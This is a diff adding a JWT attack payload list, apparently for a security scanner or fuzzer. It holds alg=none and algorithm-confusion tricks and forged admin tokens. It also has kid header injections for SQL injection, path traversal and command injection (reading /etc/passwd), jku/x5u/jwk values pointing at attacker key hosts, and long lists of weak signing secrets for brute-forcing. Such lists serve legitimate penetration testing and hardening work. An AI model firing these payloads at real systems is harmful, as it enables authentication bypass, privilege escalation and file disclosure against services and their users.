@@ -1,0 +1,83 @@
+# category: jwt
+# description: JWT attack surface — alg confusion, none, kid injection, weak secrets, JWK/JKU/x5u.
+# references: PortSwigger JWT labs, auth0 JWT best-current-practices.
+# notes: Each line is either a signature/alg trick or a full probe token with placeholder payload.
+
+alg=none
+"alg": "none"
+"alg": "None"
+"alg": "nOnE"
+"alg": "NONE"
+"alg": ""
+"alg": null
+"alg": "HS256"
+"alg": "RS256"
+"alg": "HS512"
+"alg": "ES256"
+alg confusion: swap RS256→HS256 using public key as HMAC secret
+kid=../../../dev/null
+"kid": "../../../dev/null"
+"kid": "../../../../tmp/x"
+"kid": "' UNION SELECT 'secret'-- "
+"kid": "key1\\x00"
+"jku": "https://x.test/jwks.json"
+"jku": "https://victim.test#@x.test/jwks.json"
+"x5u": "https://x.test/cert.pem"
+"x5u": "https://victim.test#@x.test/cert.pem"
+"jwk": {"kty":"RSA","e":"AQAB","n":"<attacker modulus>"}
+"typ": "JWT","alg":"none"
+"cty": "json"
+exp: 9999999999
+iat: 0
+iss: attacker.test
+sub: admin
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.XYZSIGXYZ
+weak-secret: secret
+weak-secret: password
+weak-secret: 123456
+weak-secret: changeme
+weak-secret: HS256
+weak-secret: jwt
+weak-secret: Secret123
+
+# ── JWK / x5c / cty tricks ───────────────────────────────────────────────
+"jwk": {"kty":"oct","k":"<attacker shared key>"}
+"x5c": ["<attacker self-signed cert>"]
+"cty": "x-java-serialized-object"
+"cty": "x-nested-jwt"
+"typ": "JWT","alg":"ES256K"
+
+# ── Algorithm confusion — RSA public key as HMAC secret ──────────────────
+alg=HS256, secret=<raw bytes of server RSA public key PEM>
+alg=HS256, secret=<public key with trailing newline stripped>
+alg=HS256, secret=<public key with Windows CRLF>
+
+# ── kid injection — SQLi / LFI / command ─────────────────────────────────
+"kid": "x' UNION SELECT 'secret"
+"kid": "/dev/null"
+"kid": "/proc/self/environ"
+"kid": "../../../../etc/passwd"
+"kid": "|cat /etc/passwd"
+"kid": "$(cat /etc/passwd)"
+
+# ── Billion / huge payloads ──────────────────────────────────────────────
+"name": "aaaa...aaaa" (>1MB)
+nested JWT in cty=x-nested-jwt with alg=none wrapping alg=RS256
+
+# ── Weak / common secrets ─────────────────────────────────────────────────
+weak-secret: supersecret
+weak-secret: topsecret
+weak-secret: mysecretkey
+weak-secret: jwtsecret
+weak-secret: supersecretkey
+weak-secret: your-256-bit-secret
+weak-secret: qwerty
+weak-secret: admin
+weak-secret: root
+weak-secret: letmein
+weak-secret: jwt-secret
+weak-secret: jwtSecret
+weak-secret: dev-secret
+weak-secret: test
